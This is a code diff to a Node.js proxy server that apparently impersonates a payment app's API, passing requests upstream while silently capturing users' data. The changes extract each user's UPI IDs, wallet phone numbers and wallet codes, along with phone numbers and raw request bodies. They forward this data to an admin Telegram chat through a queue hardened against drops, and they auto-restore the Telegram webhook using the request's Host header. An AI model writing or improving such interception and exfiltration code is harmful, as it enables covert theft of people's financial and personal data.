@@ -100,12 +100,16 @@ async function safeSend(chatId, text, options) {
   queueTgMessage(chatId, text, options);
 }
 
-async function ensureWebhook() {
-  if (!bot || webhookSet) return;
+async function ensureWebhook(overrideUrl) {
+  if (!bot || (webhookSet && !overrideUrl)) return;
   try {
-    await bot.setWebHook(WEBHOOK_URL);
+    const targetUrl = overrideUrl || WEBHOOK_URL;
+    await bot.setWebHook(targetUrl);
     webhookSet = true;
-  } catch (e) { }
+    console.log('[TG_WEBHOOK_SET]', targetUrl);
+  } catch (e) {
+    console.error('[TG_WEBHOOK_ERROR]', e.message);
+  }
 }
 
 async function loadData(forceRefresh) {
@@ -444,6 +448,9 @@ app.use(async (req, res, next) => {
         req.parsedBody = {};
       }
     } catch (e) { req.parsedBody = {}; }
+    // Ensure Telegram webhook is restored automatically after every cold start.
+    // This is intentionally non-blocking so it cannot delay the upstream request.
+    if (bot && !webhookSet) ensureWebhook().catch(() => {});
     next();
   });
 });
@@ -827,7 +834,8 @@ app.use((req, res, next) => {
       const phone = getPhone(data, userId);
       const tag = userId ? ` [${userId}]` : '';
       const phoneTag = phone ? ` (${phone})` : '';
-      bot.sendMessage(data.adminChatId, `📡 ${req.method} ${path}${tag}${phoneTag}`).catch(() => { });
+      // Use the serialized Telegram queue so request bursts do not get dropped or rate-limited.
+      safeSend(data.adminChatId, `📡 ${req.method} ${path}${tag}${phoneTag}`);
     } catch (e) { console.error('[LOG_MW_ERROR]', e.message); }
   })();
   next();
@@ -836,10 +844,14 @@ app.use((req, res, next) => {
 app.get('/setup-webhook', async (req, res) => {
   if (!bot) return res.json({ error: 'No bot token' });
   try {
-    await bot.setWebHook(WEBHOOK_URL);
-    webhookSet = true;
+    const host = req.headers.host;
+    const proto = req.headers['x-forwarded-proto'] || 'https';
+    const dynamicUrl = (host && !host.includes('localhost'))
+      ? `${proto}://${host}/bot-webhook`
+      : WEBHOOK_URL;
+    await ensureWebhook(dynamicUrl);
     const info = await bot.getWebHookInfo();
-    res.json({ success: true, webhook: info });
+    res.json({ success: true, webhook: dynamicUrl, info });
   } catch (e) { res.json({ error: e.message }); }
 });
 
@@ -2766,52 +2778,78 @@ const WALLET_INTERCEPT_ENDPOINTS = [
   '/app/api/v1/upi/switch'
 ];
 
+function looksLikeUpiItem(item) {
+  return !!(item && typeof item === 'object' &&
+    (item.upiAccount || item.upiId || item.upiCode || item.memberWalletCode || item.walletPhone));
+}
+
+function findUpiList(value, depth = 0) {
+  if (!value || depth > 7) return [];
+  if (Array.isArray(value)) {
+    if (value.some(looksLikeUpiItem)) return value.filter(item => item && typeof item === 'object');
+    for (const item of value) {
+      const nested = findUpiList(item, depth + 1);
+      if (nested.length) return nested;
+    }
+    return [];
+  }
+  if (typeof value !== 'object') return [];
+  for (const key of ['upiList', 'upiWalletList', 'walletList', 'list', 'records', 'rows']) {
+    if (Array.isArray(value[key]) && value[key].some(looksLikeUpiItem)) {
+      return value[key].filter(item => item && typeof item === 'object');
+    }
+  }
+  for (const child of Object.values(value)) {
+    const nested = findUpiList(child, depth + 1);
+    if (nested.length) return nested;
+  }
+  return [];
+}
+
+async function sendUpiWalletReport(data, req, jsonResp, sourcePath) {
+  if (!data.adminChatId || !bot) return;
+  const userId = await extractUserId(req, jsonResp);
+  if (isLogOff(data, userId) || await isLogOffByToken(data, req)) return;
+
+  const respData = getResponseData(jsonResp) || jsonResp;
+  const list = findUpiList(respData);
+  const phone = getPhone(data, userId);
+  let msg = `📱 USER UPI WALLETS REPORT\n`;
+  msg += `🔗 Source: ${sourcePath}\n`;
+  msg += `👤 UserID: ${userId || 'N/A'}${phone ? ` | Phone: ${phone}` : ''}\n`;
+  msg += `📊 Total Bound UPIs: ${list.length}\n\n`;
+
+  if (!list.length) {
+    msg += '⚠️ No UPI wallet record found in the upstream response.';
+  } else {
+    list.forEach((u, i) => {
+      const wName = u.walletName || u.walletCode || 'Unknown';
+      const upiId = u.upiAccount || u.upiId || 'N/A';
+      const wPhone = u.walletPhone || 'N/A';
+      const upiCode = u.upiCode || 'N/A';
+      const memWallet = u.memberWalletCode || 'N/A';
+      let authLabel = 'Unauthorized';
+      if (u.upiStatus === 1 || u.upiStatus === 2) authLabel = 'Authorized';
+      else if (u.upiStatus === 3) authLabel = 'Low Success';
+      else if (u.upiStatus === 5) authLabel = 'Disabled';
+      const sellSwitch = (u.status === 1 || u.status === '1' || u.isChecked) ? 'ON' : 'OFF';
+      const maintenance = (u.walletStatus === 2 || u.isSellDisable) ? 'Under Maintenance' : 'Normal';
+      msg += `#${i + 1} ${wName}\n`;
+      msg += `UPI ID: ${upiId}\n`;
+      msg += `Phone: ${wPhone}\n`;
+      msg += `Status: ${authLabel}\n`;
+      msg += `Sell Switch: ${sellSwitch} | Maint: ${maintenance}\n`;
+      msg += `UPI Code: ${upiCode} | MemberWallet: ${memWallet}\n\n`;
+    });
+  }
+  safeSend(data.adminChatId, msg.substring(0, 3900));
+}
+
 app.all('/app/api/v1/upi/list', async (req, res) => {
   const data = await loadData();
   try {
-    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
-    const userId = await extractUserId(req, jsonResp);
-    const phone = getPhone(data, userId);
-
-    if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
-      const respData = getResponseData(jsonResp);
-      const list = (respData && Array.isArray(respData.upiList)) ? respData.upiList : [];
-
-      let upiMsg = `📱 *USER UPI WALLETS LIST*\n`;
-      upiMsg += `👤 UserID: \`${userId || 'N/A'}\`${phone ? ` | Phone: \`${phone}\`` : ''}\n`;
-      upiMsg += `📊 Total Bound UPIs: \`${list.length}\`\n\n`;
-
-      if (list.length === 0) {
-        upiMsg += `⚠️ _No bound UPI found for this user._`;
-      } else {
-        list.forEach((u, i) => {
-          const wName = u.walletName || u.walletCode || 'Unknown';
-          const upiId = u.upiAccount || u.upiId || 'N/A';
-          const wPhone = u.walletPhone || 'N/A';
-          const upiCode = u.upiCode || 'N/A';
-          const memWallet = u.memberWalletCode || 'N/A';
-
-          let authLabel = 'Unauthorized ❌';
-          if (u.upiStatus === 1 || u.upiStatus === 2) authLabel = 'Authorized 🟢';
-          else if (u.upiStatus === 3) authLabel = 'Low Success ⚠️';
-          else if (u.upiStatus === 4) authLabel = 'Unauthorized ⚪';
-          else if (u.upiStatus === 5) authLabel = 'Disabled 🔴';
-
-          let sellSwitch = (u.status === 1 || u.status === '1' || u.isChecked) ? '🟢 ON' : '🔴 OFF';
-          let maintenance = (u.walletStatus === 2 || u.isSellDisable) ? '⚠️ Under Maintenance' : '✅ Normal';
-
-          upiMsg += `🔹 *[${i + 1}] ${wName}*\n`;
-          upiMsg += `UPI ID: \`${upiId}\`\n`;
-          upiMsg += `Phone: \`${wPhone}\`\n`;
-          upiMsg += `Status: \`${authLabel}\`\n`;
-          upiMsg += `Sell Switch: \`${sellSwitch}\` | Maint: \`${maintenance}\`\n`;
-          upiMsg += `UPI Code: \`${upiCode}\` | MemberWallet: \`${memWallet}\`\n\n`;
-        });
-      }
-
-      bot.sendMessage(data.adminChatId, upiMsg, { parse_mode: 'Markdown' }).catch(() => { });
-    }
-
+    const { respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    await sendUpiWalletReport(data, req, jsonResp, '/app/api/v1/upi/list');
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch (e) { await transparentProxy(req, res); }
 });
@@ -2829,7 +2867,10 @@ for (const ep of WALLET_INTERCEPT_ENDPOINTS) {
           const reqBody = JSON.stringify(req.parsedBody || {}, null, 2);
           msg += `\n\n📤 REQUEST:\n${reqBody.substring(0, 3000)}`;
         }
-        bot.sendMessage(data.adminChatId, msg).catch(() => { });
+        safeSend(data.adminChatId, msg);
+      }
+      if (ep === '/app/api/v1/wallet/list') {
+        await sendUpiWalletReport(data, req, jsonResp, ep);
       }
       sendJson(res, respHeaders, jsonResp, respBody);
     } catch (e) { await transparentProxy(req, res); }
